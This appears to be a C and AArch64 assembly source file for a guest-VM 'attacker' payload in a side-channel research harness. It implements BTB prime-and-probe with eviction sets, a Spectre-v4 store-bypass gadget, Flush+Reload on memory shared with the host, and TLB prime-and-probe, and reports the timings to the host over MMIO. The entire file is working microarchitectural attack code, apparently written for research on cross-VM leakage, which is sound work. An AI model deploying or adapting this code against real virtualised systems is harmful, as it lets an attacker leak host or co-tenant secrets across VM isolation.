// guest.c -- xvm attacker: a freestanding guest-EL0 payload (VA 0x100000000000, see guest.ld). Primes K
// co-set BTB entries, then after the host victim's branches probes all K and returns the summed reload
// latency over MMIO. A canonical host branch evicts a primed entry and lifts the latency.
#include <stdint.h>

#define GVA        0x0000100000000000UL
#define PHASE_VA   (GVA + 0x0100000)      // host writes [0]=phase(u32)
#define SLOT_VA    (GVA + 0x0200000)      // per-entry stub slots: [k*32 + 0]=tgt [+8]=and [+16]=xor
#define SBUF_VA    (GVA + 0x0210000)      // v4 store-bypass gadget scratch
#define IDXBUF_VA  (GVA + 0x0211000)
#define TARGET_VA  (GVA + 0x2000000)      // PROBE_VA[k] = TARGET_VA + k*STRIDE
#define FUNCA_VA   (GVA + 0x2800000)      // FUNCA[k] = FUNCA_VA + k*64, touches MK[k]
#define MK_VA      (GVA + 0x3000000)      // MK[k] = MK_VA + k*STRIDE_BYTES
#define MMIO_VA    (GVA + 0x4000000)
#define SHARE_VA   (GVA + 0x1000000)       // a line in guest RAM the host also maps: the Flush and Reload target
#define DTLB_VA    (GVA + 0x1800000)       // guest data pages for the dTLB prime and probe
#define ITLB_VA    (GVA + 0x3800000)       // guest executable pages for the iTLB prime and probe
#define STRIDE_BYTES 4096
#define STRIDE     0x2000UL               // co-set stride: one BTB set
#define KENTRIES   40                     // eviction-set size
#define TLB_PAGES  160                    // flood the fully-associative TLB

#define PHASE_PRIME 1
#define PHASE_PROBE 2
#define PHASE_FLUSH 3
#define PHASE_RELOAD 4
#define PHASE_PRIME_DTLB 5
#define PHASE_PROBE_DTLB 6
#define PHASE_PRIME_ITLB 7
#define PHASE_PROBE_ITLB 8
#define TRAIN 8

typedef void (*branch_fn_t)(void);
static inline void call_va(uint64_t va) {
    ((branch_fn_t)va)();
}
static inline void fence(void) {
    asm volatile("dsb sy\n isb\n" ::: "memory");
}
static inline void flush(uint64_t va) {
    asm volatile("dc civac,%0" :: "r"(va) : "memory");
}
static inline uint64_t time_load(uint64_t addr) {
    uint64_t t0 = 0;
    uint64_t t1 = 0;
    uint64_t value = 0;
    asm volatile("isb\n mrs %0,cntvct_el0\n isb\n" : "=r"(t0) :: "memory");
    asm volatile("ldr %0,[%1]" : "=r"(value) : "r"(addr) : "memory");
    asm volatile("dsb ld\n isb\n mrs %0,cntvct_el0\n" : "=r"(t1) :: "memory");
    (void)value;
    return t1 - t0;
}

static volatile uint32_t *phase = (volatile uint32_t *)PHASE_VA;

static inline uint64_t probe_va(int k) { return TARGET_VA + (uint64_t)k * STRIDE; }
static inline uint64_t funcA_va(int k) { return FUNCA_VA + (uint64_t)k * 64; }
static inline uint64_t mk_va(int k)    { return MK_VA + (uint64_t)k * STRIDE_BYTES; }
static inline volatile uint64_t *slot_of(int k) { return (volatile uint64_t *)(SLOT_VA + (uint64_t)k * 32); }

// Spectre-v4 store-bypass window: the branch runs only speculatively, so a non-canonical target never commits.
static inline void v4call(uint64_t stub) {
    *(volatile long *)SBUF_VA = 1;
    *(volatile long *)IDXBUF_VA = 0;
    flush(IDXBUF_VA);
    fence();
    long index = *(volatile long *)IDXBUF_VA;
    *(volatile long *)(SBUF_VA + (uint64_t)index * 8) = 0;
    if (*(volatile long *)SBUF_VA) {
        ((branch_fn_t)stub)();
    }
}

// Seat all K entries: each predicts its own funcA. Round-robin so the set holds all K.
static void do_prime(void) {
    for (int k = 0; k < KENTRIES; ++k) {
        volatile uint64_t *slot = slot_of(k);
        slot[0] = funcA_va(k);
        slot[1] = ~0UL;
        slot[2] = 0;
    }
    for (int train = 0; train < TRAIN; ++train) {
        for (int k = 0; k < KENTRIES; ++k) {
            call_va(probe_va(k));
        }
    }
}

// Probe all K: a surviving entry speculatively runs its funcA and leaves its mk line resident. An evicted
// entry stays flushed. Sum the reload latencies: higher means the host branch was canonical.
static uint64_t do_probe(void) {
    for (int k = 0; k < KENTRIES; ++k) {
        flush(mk_va(k));
        slot_of(k)[2] = (1UL << 55);           // real target masked non-canonical (benign arch)
    }
    fence();
    uint64_t total = 0;
    for (int k = KENTRIES - 1; k >= 0; --k) {
        slot_of(k)[0] = funcA_va(k);
        v4call(probe_va(k));
        fence();
        total += time_load(mk_va(k));
    }
    return total;
}

// Flush and Reload over the shared cache. The guest flushes a shared line, the host victim touches it only
// when canonical, and the guest reloads it. The reload hits the shared last-level cache across the world-switch.
static void do_flush(void) {
    flush(SHARE_VA);
    fence();
}
static uint64_t do_reload(void) {
    return time_load(SHARE_VA);
}

static inline uint64_t cyc(void) {
    uint64_t t = 0;
    asm volatile("isb\n mrs %0,cntvct_el0\n isb" : "=r"(t) :: "memory");
    return t;
}

// Flood the guest's own dTLB with TLB_PAGES distinct pages and probe them in reverse. Since the TLBs are
// VMID-tagged this reads the guest's dTLB, not the host's.
static void do_prime_dtlb(void) {
    for (int i = 0; i < TLB_PAGES; ++i) {
        volatile uint8_t v = *(volatile uint8_t *)(DTLB_VA + (uint64_t)i * 4096);
        (void)v;
    }
    fence();
}
static uint64_t do_probe_dtlb(void) {
    uint64_t total = 0;
    for (int i = TLB_PAGES - 1; i >= 0; --i) {
        total += time_load(DTLB_VA + (uint64_t)i * 4096);
    }
    fence();
    return total;
}

// Flood the guest's iTLB by fetching across the pages. The host lays a ret at each page head before the VM
// runs, so the guest only fetches (no self-modification).
static void do_prime_itlb(void) {
    for (int i = 0; i < TLB_PAGES; ++i) {
        call_va(ITLB_VA + (uint64_t)i * 4096);
    }
    fence();
}
static uint64_t do_probe_itlb(void) {
    uint64_t total = 0;
    for (int i = TLB_PAGES - 1; i >= 0; --i) {
        uint64_t t0 = cyc();
        call_va(ITLB_VA + (uint64_t)i * 4096);
        total += cyc() - t0;
    }
    fence();
    return total;
}

void c_entry(void) {
    uint64_t result = 0;
    switch (*phase) {
        case PHASE_PRIME:
            do_prime();
            break;
        case PHASE_PROBE:
            result = do_probe();
            break;
        case PHASE_FLUSH:
            do_flush();
            break;
        case PHASE_RELOAD:
            result = do_reload();
            break;
        case PHASE_PRIME_DTLB:
            do_prime_dtlb();
            break;
        case PHASE_PROBE_DTLB:
            result = do_probe_dtlb();
            break;
        case PHASE_PRIME_ITLB:
            do_prime_itlb();
            break;
        case PHASE_PROBE_ITLB:
            result = do_probe_itlb();
            break;
        default:
            break;
    }
    *(volatile uint64_t *)MMIO_VA = result;    // MMIO exit -> KVM_EXIT_MMIO
    for (;;) {
        asm volatile("wfe");
    }
}

asm(
".global _start\n"
"_start:\n"
"   movz x9, #0x0000\n"
"   movk x9, #0x01f0, lsl #16\n"
"   movk x9, #0x1000, lsl #32\n"     // x9 = 0x100001f00000 (stack top, 31 MB)
"   mov  sp, x9\n"
"   bl   c_entry\n"
"   b    .\n"
);
